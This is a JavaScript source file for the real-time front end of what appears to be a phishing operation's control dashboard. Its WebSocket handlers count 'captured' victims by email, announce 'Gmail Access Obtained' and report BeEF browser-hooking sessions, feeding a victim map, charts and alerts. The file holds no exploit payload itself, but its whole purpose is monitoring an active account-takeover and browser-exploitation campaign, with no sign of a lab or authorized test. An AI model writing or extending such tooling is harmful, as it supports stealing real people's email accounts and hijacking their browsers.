/**
 * WebSocket Client for Real-time Dashboard Updates
 * Handles WebSocket connection and real-time data streaming
 */

class DashboardWebSocketClient {
    constructor() {
        this.websocket = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
        this.reconnectDelay = 1000;
        this.heartbeatInterval = null;
        this.heartbeatTimeout = null;
        this.isConnected = false;
        this.subscriptions = new Set();
        
        // Event handlers
        this.eventHandlers = {
            victim_captured: [],
            gmail_access_update: [],
            beef_session_update: [],
            campaign_update: [],
            metrics_update: [],
            system_alert: [],
            connection_status: []
        };
        
        this.init();
    }
    
    init() {
        this.connect();
        this.setupEventListeners();
    }
    
    connect() {
        try {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/ws/dashboard`;
            
            console.log('Connecting to WebSocket:', wsUrl);
            
            this.websocket = new WebSocket(wsUrl);
            
            this.websocket.onopen = (event) => {
                console.log('WebSocket connected');
                this.isConnected = true;
                this.reconnectAttempts = 0;
                this.startHeartbeat();
                this.resubscribe();
                this.emitEvent('connection_status', { status: 'connected', timestamp: new Date().toISOString() });
            };
            
            this.websocket.onmessage = (event) => {
                this.handleMessage(event);
            };
            
            this.websocket.onclose = (event) => {
                console.log('WebSocket disconnected:', event.code, event.reason);
                this.isConnected = false;
                this.stopHeartbeat();
                this.emitEvent('connection_status', { status: 'disconnected', timestamp: new Date().toISOString() });
                
                if (!event.wasClean && this.reconnectAttempts < this.maxReconnectAttempts) {
                    this.scheduleReconnect();
                }
            };
            
            this.websocket.onerror = (error) => {
                console.error('WebSocket error:', error);
                this.emitEvent('connection_status', { status: 'error', timestamp: new Date().toISOString() });
            };
            
        } catch (error) {
            console.error('Failed to create WebSocket connection:', error);
            this.scheduleReconnect();
        }
    }
    
    handleMessage(event) {
        try {
            const data = JSON.parse(event.data);
            
            // Handle different message types
            switch (data.type) {
                case 'pong':
                    this.handlePong();
                    break;
                case 'victim_captured':
                    this.emitEvent('victim_captured', data);
                    break;
                case 'gmail_access_update':
                    this.emitEvent('gmail_access_update', data);
                    break;
                case 'beef_session_update':
                    this.emitEvent('beef_session_update', data);
                    break;
                case 'campaign_update':
                    this.emitEvent('campaign_update', data);
                    break;
                case 'metrics_update':
                    this.emitEvent('metrics_update', data);
                    break;
                case 'system_alert':
                    this.emitEvent('system_alert', data);
                    break;
                default:
                    console.log('Unknown message type:', data.type);
            }
            
        } catch (error) {
            console.error('Error parsing WebSocket message:', error);
        }
    }
    
    sendMessage(type, data = {}) {
        if (!this.isConnected || !this.websocket) {
            console.warn('WebSocket not connected, cannot send message');
            return false;
        }
        
        try {
            const message = {
                type: type,
                data: data,
                timestamp: new Date().toISOString()
            };
            
            this.websocket.send(JSON.stringify(message));
            return true;
        } catch (error) {
            console.error('Error sending WebSocket message:', error);
            return false;
        }
    }
    
    subscribe(channel) {
        this.subscriptions.add(channel);
        this.sendMessage('subscribe', { channel: channel });
    }
    
    unsubscribe(channel) {
        this.subscriptions.delete(channel);
        this.sendMessage('unsubscribe', { channel: channel });
    }
    
    resubscribe() {
        this.subscriptions.forEach(channel => {
            this.sendMessage('subscribe', { channel: channel });
        });
    }
    
    startHeartbeat() {
        this.heartbeatInterval = setInterval(() => {
            this.sendPing();
        }, 30000); // Send ping every 30 seconds
    }
    
    stopHeartbeat() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
        }
        
        if (this.heartbeatTimeout) {
            clearTimeout(this.heartbeatTimeout);
            this.heartbeatTimeout = null;
        }
    }
    
    sendPing() {
        if (this.isConnected) {
            this.sendMessage('ping');
            
            // Set timeout for pong response
            this.heartbeatTimeout = setTimeout(() => {
                console.warn('Pong timeout, reconnecting...');
                this.reconnect();
            }, 10000); // 10 second timeout
        }
    }
    
    handlePong() {
        if (this.heartbeatTimeout) {
            clearTimeout(this.heartbeatTimeout);
            this.heartbeatTimeout = null;
        }
    }
    
    scheduleReconnect() {
        this.reconnectAttempts++;
        const delay = this.reconnectDelay * Math.pow(2, this.reconnectAttempts - 1);
        
        console.log(`Scheduling reconnect attempt ${this.reconnectAttempts} in ${delay}ms`);
        
        setTimeout(() => {
            this.connect();
        }, delay);
    }
    
    reconnect() {
        if (this.websocket) {
            this.websocket.close();
        }
        this.connect();
    }
    
    emitEvent(eventType, data) {
        if (this.eventHandlers[eventType]) {
            this.eventHandlers[eventType].forEach(handler => {
                try {
                    handler(data);
                } catch (error) {
                    console.error(`Error in event handler for ${eventType}:`, error);
                }
            });
        }
    }
    
    on(eventType, handler) {
        if (this.eventHandlers[eventType]) {
            this.eventHandlers[eventType].push(handler);
        } else {
            console.warn(`Unknown event type: ${eventType}`);
        }
    }
    
    off(eventType, handler) {
        if (this.eventHandlers[eventType]) {
            const index = this.eventHandlers[eventType].indexOf(handler);
            if (index > -1) {
                this.eventHandlers[eventType].splice(index, 1);
            }
        }
    }
    
    setupEventListeners() {
        // Handle page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.stopHeartbeat();
            } else {
                if (this.isConnected) {
                    this.startHeartbeat();
                }
            }
        });
        
        // Handle page unload
        window.addEventListener('beforeunload', () => {
            this.disconnect();
        });
        
        // Handle online/offline events
        window.addEventListener('online', () => {
            console.log('Network online, attempting to reconnect...');
            this.reconnect();
        });
        
        window.addEventListener('offline', () => {
            console.log('Network offline');
            this.emitEvent('connection_status', { status: 'offline', timestamp: new Date().toISOString() });
        });
    }
    
    disconnect() {
        this.stopHeartbeat();
        
        if (this.websocket) {
            this.websocket.close(1000, 'Client disconnecting');
            this.websocket = null;
        }
        
        this.isConnected = false;
    }
    
    getConnectionStatus() {
        return {
            connected: this.isConnected,
            reconnectAttempts: this.reconnectAttempts,
            subscriptions: Array.from(this.subscriptions)
        };
    }
}

/**
 * Real-time Dashboard Manager
 * Coordinates real-time updates across dashboard components
 */
class RealtimeDashboard {
    constructor() {
        this.wsClient = null;
        this.components = new Map();
        this.updateQueue = [];
        this.isProcessing = false;
        
        this.init();
    }
    
    init() {
        this.wsClient = new DashboardWebSocketClient();
        this.setupWebSocketHandlers();
        this.startUpdateProcessor();
    }
    
    setupWebSocketHandlers() {
        // Victim captured handler
        this.wsClient.on('victim_captured', (data) => {
            this.handleVictimCaptured(data);
        });
        
        // Gmail access update handler
        this.wsClient.on('gmail_access_update', (data) => {
            this.handleGmailAccessUpdate(data);
        });
        
        // BeEF session update handler
        this.wsClient.on('beef_session_update', (data) => {
            this.handleBeEFSessionUpdate(data);
        });
        
        // Campaign update handler
        this.wsClient.on('campaign_update', (data) => {
            this.handleCampaignUpdate(data);
        });
        
        // Metrics update handler
        this.wsClient.on('metrics_update', (data) => {
            this.handleMetricsUpdate(data);
        });
        
        // System alert handler
        this.wsClient.on('system_alert', (data) => {
            this.handleSystemAlert(data);
        });
        
        // Connection status handler
        this.wsClient.on('connection_status', (data) => {
            this.handleConnectionStatus(data);
        });
    }
    
    handleVictimCaptured(data) {
        this.queueUpdate('victim_captured', data);
        
        // Update victim map if available
        if (window.victimMap) {
            window.victimMap.addNewVictim(data.data);
        }
        
        // Update charts if available
        if (window.dashboardCharts) {
            window.dashboardCharts.addDataPoint('timeline', 0, 1);
        }
        
        // Show notification
        this.showNotification('New Victim Captured', `Victim: ${data.data.email}`, 'success');
    }
    
    handleGmailAccessUpdate(data) {
        this.queueUpdate('gmail_access_update', data);
        
        // Update charts if available
        if (window.dashboardCharts) {
            window.dashboardCharts.addDataPoint('timeline', 1, 1);
        }
        
        // Show notification
        this.showNotification('Gmail Access Obtained', `Victim: ${data.data.victim_id}`, 'info');
    }
    
    handleBeEFSessionUpdate(data) {
        this.queueUpdate('beef_session_update', data);
        
        // Update charts if available
        if (window.dashboardCharts) {
            window.dashboardCharts.addDataPoint('timeline', 2, 1);
        }
        
        // Show notification
        this.showNotification('BeEF Session Established', `Session: ${data.data.session_id}`, 'warning');
    }
    
    handleCampaignUpdate(data) {
        this.queueUpdate('campaign_update', data);
        
        // Show notification
        this.showNotification('Campaign Update', data.data.message, 'info');
    }
    
    handleMetricsUpdate(data) {
        this.queueUpdate('metrics_update', data);
        
        // Update performance chart if available
        if (window.dashboardCharts) {
            window.dashboardCharts.updatePerformanceChart(data.data);
        }
    }
    
    handleSystemAlert(data) {
        this.queueUpdate('system_alert', data);
        
        // Show alert notification
        this.showNotification('System Alert', data.data.message, 'danger');
    }
    
    handleConnectionStatus(data) {
        this.updateConnectionStatus(data.status);
    }
    
    queueUpdate(type, data) {
        this.updateQueue.push({
            type: type,
            data: data,
            timestamp: Date.now()
        });
    }
    
    startUpdateProcessor() {
        setInterval(() => {
            this.processUpdateQueue();
        }, 100); // Process updates every 100ms
    }
    
    processUpdateQueue() {
        if (this.isProcessing || this.updateQueue.length === 0) {
            return;
        }
        
        this.isProcessing = true;
        
        while (this.updateQueue.length > 0) {
            const update = this.updateQueue.shift();
            this.processUpdate(update);
        }
        
        this.isProcessing = false;
    }
    
    processUpdate(update) {
        // Update dashboard metrics
        this.updateDashboardMetrics(update);
        
        // Update activity feed
        this.updateActivityFeed(update);
        
        // Update last update time
        this.updateLastUpdateTime();
    }
    
    updateDashboardMetrics(update) {
        const metricElements = {
            'victim_captured': 'activeVictims',
            'gmail_access_update': 'gmailAccess',
            'beef_session_update': 'beefSessions'
        };
        
        const elementId = metricElements[update.type];
        if (elementId) {
            const element = document.getElementById(elementId);
            if (element) {
                const currentValue = parseInt(element.textContent) || 0;
                element.textContent = currentValue + 1;
            }
        }
    }
    
    updateActivityFeed(update) {
        const activityFeed = document.getElementById('activityFeed');
        if (!activityFeed) return;
        
        // Remove loading message if present
        const loadingMsg = activityFeed.querySelector('.text-center');
        if (loadingMsg) {
            loadingMsg.remove();
        }
        
        const activityItem = document.createElement('div');
        activityItem.className = 'activity-item';
        
        const activityConfig = {
            'victim_captured': { icon: 'fas fa-user', type: 'victim', message: `New victim captured: ${update.data.data.email}` },
            'gmail_access_update': { icon: 'fas fa-envelope', type: 'gmail', message: `Gmail access obtained for ${update.data.data.victim_id}` },
            'beef_session_update': { icon: 'fas fa-bug', type: 'beef', message: `BeEF session established: ${update.data.data.session_id}` },
            'campaign_update': { icon: 'fas fa-bullhorn', type: 'system', message: update.data.data.message },
            'system_alert': { icon: 'fas fa-exclamation-triangle', type: 'system', message: update.data.data.message }
        };
        
        const config = activityConfig[update.type];
        if (config) {
            activityItem.innerHTML = `
                <div class="activity-icon ${config.type}">
                    <i class="${config.icon}"></i>
                </div>
                <div class="flex-grow-1">
                    <div class="fw-bold">${config.message}</div>
                    <small class="text-muted">${new Date(update.timestamp).toLocaleString()}</small>
                </div>
            `;
            
            activityFeed.insertBefore(activityItem, activityFeed.firstChild);
            
            // Keep only last 10 items
            const items = activityFeed.querySelectorAll('.activity-item');
            if (items.length > 10) {
                items[items.length - 1].remove();
            }
        }
    }
    
    updateLastUpdateTime() {
        const lastUpdateElement = document.getElementById('lastUpdate');
        if (lastUpdateElement) {
            lastUpdateElement.textContent = new Date().toLocaleTimeString();
        }
    }
    
    updateConnectionStatus(status) {
        const statusElement = document.querySelector('.status-indicator');
        const statusText = document.querySelector('.status-indicator').nextElementSibling;
        
        if (statusElement && statusText) {
            statusElement.className = `status-indicator status-${status === 'connected' ? 'online' : 'offline'}`;
            statusText.textContent = status === 'connected' ? 'System Online' : 'System Offline';
        }
    }
    
    showNotification(title, message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        if (!container) return;
        
        const toast = document.createElement('div');
        toast.className = `toast show`;
        toast.innerHTML = `
            <div class="toast-header bg-${type} text-white">
                <strong class="me-auto">${title}</strong>
                <button type="button" class="btn-close btn-close-white" onclick="this.closest('.toast').remove()"></button>
            </div>
            <div class="toast-body">
                ${message}
            </div>
        `;
        
        container.appendChild(toast);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (toast.parentNode) {
                toast.remove();
            }
        }, 5000);
    }
    
    registerComponent(name, component) {
        this.components.set(name, component);
    }
    
    unregisterComponent(name) {
        this.components.delete(name);
    }
    
    destroy() {
        if (this.wsClient) {
            this.wsClient.disconnect();
        }
        
        this.components.clear();
        this.updateQueue = [];
    }
}

// Initialize real-time dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    window.realtimeDashboard = new RealtimeDashboard();
    
    // Make WebSocket client globally available
    window.websocket = window.realtimeDashboard.wsClient;
});

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { DashboardWebSocketClient, RealtimeDashboard };
}
